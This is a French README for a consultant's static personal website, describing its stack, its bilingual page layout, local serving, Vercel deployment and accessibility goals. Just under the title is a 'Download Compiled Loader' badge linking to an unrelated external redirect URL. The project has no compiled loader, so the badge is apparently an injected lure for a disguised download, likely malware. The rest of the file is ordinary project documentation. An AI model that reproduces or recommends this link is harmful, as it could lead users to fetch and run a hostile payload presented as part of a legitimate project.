# Life and Learning · lifeandlearning.fr

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Site personnel de Zalihata Ahamada — Design Ops Manager, formatrice, conférencière.

Strategy & Academy : consulting et formation pour les équipes et les leaders qui veulent mieux s'organiser. Pour le bien de tous.

---

## 🏗️ Stack technique

- **HTML / CSS / JS vanilla** — pas de framework, pas de build tool pour le MVP
- **Fonts self-hosted** via Fontsource (Poppins, Inter, Fraunces, Caveat) — `assets/fonts/`
- **Hébergement** : Vercel (déploiement automatique sur push `main`)
- **Domaine** : lifeandlearning.fr
- **Analytics** : Plausible (à venir post-MVP)
- **Booking** : Cal.com intégré
- **Paiement** : Stripe Payment Links

## 🌍 Multilingue

Architecture par URL distincte (pages dupliquées) :

- `/` — version française (par défaut)
- `/en/` — version anglaise

Pas de bascule JavaScript : chaque langue a son URL stable, SEO-friendly, partageable, fonctionne sans JS.

**Périmètre EN au lancement (11 mai 2026)** :
- Home, Strategy, Academy, Contact, Mentions légales, 404
- Academy / Design Ops, Academy / Management
- Cas / index + tous les cas d'étude

Les autres formations (Anglais professionnel, Facilitation à distance, Storytelling) sont disponibles en français uniquement au lancement, en stub "Programme en construction".

## 📁 Arborescence

```
.
├── index.html                              # Home FR
├── 404.html                                # FR
│
├── pages/                                  # Pages chapeau et secondaires FR
│   ├── strategy.html                       # Page chapeau Strategy
│   ├── academy.html                        # Page chapeau Academy
│   ├── academy/                            # Sous-pages formations
│   │   ├── design-ops.html                 # Complète
│   │   ├── management.html                 # Complète
│   │   ├── anglais-professionnel.html      # Stub
│   │   ├── facilitation-distance.html      # Stub
│   │   └── storytelling.html               # Stub
│   ├── labo.html
│   ├── mentions-legales.html
│   ├── cgv.html
│   └── confidentialite.html
│
├── cas/                                    # Études de cas FR
│   ├── index.html                          # Page chapeau (stratégie/méthode + liste)
│   ├── client-energie.html
│   ├── glovo-zeppelin.html
│   └── bpce-si.html                        # Teaser PDF
│
├── en/                                     # Version anglaise
│   ├── index.html
│   ├── 404.html
│   ├── pages/
│   │   ├── strategy.html
│   │   ├── academy.html
│   │   ├── academy/
│   │   │   ├── design-ops.html
│   │   │   └── management.html
│   │   ├── legal-notice.html
│   │   ├── terms.html
│   │   └── privacy.html
│   └── cas/
│       ├── index.html
│       ├── client-energie.html
│       ├── glovo-zeppelin.html
│       └── bpce-si.html
│
├── assets/
│   ├── fonts/                              # Fontsource self-hosted
│   ├── logos/                              # SVG du papillon + favicons
│   ├── illustrations/                      # Dessins de la fille de Zalihata
│   ├── ornements/                          # Calligraphies du mari de Zalihata
│   ├── photos/                             # Photos terrain (ateliers, conférences)
│   └── docs/                               # PDFs téléchargeables
│
├── css/                                    # CSS séparé (V2 post-MVP, pour l'instant tout est inline)
├── js/                                     # JS minimal (animations, toggles)
│
└── docs/                                   # Documentation projet
    ├── DECISIONS.md
    ├── ADR/                                # Architecture Decision Records
    ├── design-system/                      # Documentation DS Life and Learning
    ├── guide-vectorisation-illustrator.md
    └── TODO-semaine-2026-05-04.md
```

## 🚀 Développement local

Aucun build, aucune dépendance npm. Pour servir le site localement :

```bash
# Avec Python 3 (préinstallé sur Mac)
python3 -m http.server 8000

# Puis ouvrir http://localhost:8000
```

Ou drag & drop le fichier `index.html` dans le navigateur (les fonts ne chargeront pas par contre, il faut un serveur).

## 📦 Déploiement

Push sur `main` → déploiement automatique Vercel.

Branche de travail recommandée pour les évolutions : `mvp` ou nommée par feature.

## ♿ Accessibilité

Le site vise WCAG 2.2 AA :
- Contrastes vérifiés (texte grey-900 sur paper-base, surligneurs avec contraste suffisant)
- Skip link en début de page
- Focus visible (outline 3px turquoise)
- Animations respectent `prefers-reduced-motion`
- Sémantique HTML5 (header, main, section, article, nav, footer)
- Illustrations avec `role="img"` et `aria-labelledby` ou `aria-hidden="true"` selon nature

## 🌱 Éco-conception (RGESN)

- Texture de fond en SVG inline (pas d'image bitmap)
- Surligneurs en SVG inline data URI
- Fonts self-hostées sans CDN externe
- Pas de tracking publicitaire
- Pas de scripts tiers superflus
- Hébergement Vercel (Europe)

## 👥 Contributeurs créatifs

- **Zalihata Ahamada** — direction, contenus, code
- **[Fille de Zalihata]** — illustrations figuratives au crayon
- **[Mari de Zalihata, @lafeuille2gui]** — calligraphies et ornements

## 📄 Licence

Code source : à définir.
Contenus textuels et créations visuelles (illustrations, calligraphies) : tous droits réservés.

## 🤖 Note sur la production

Site développé en pair-programming avec Claude (Anthropic), itération directement dans le HTML par modifications ciblées.

---

*Dernière mise à jour : mai 2026.*

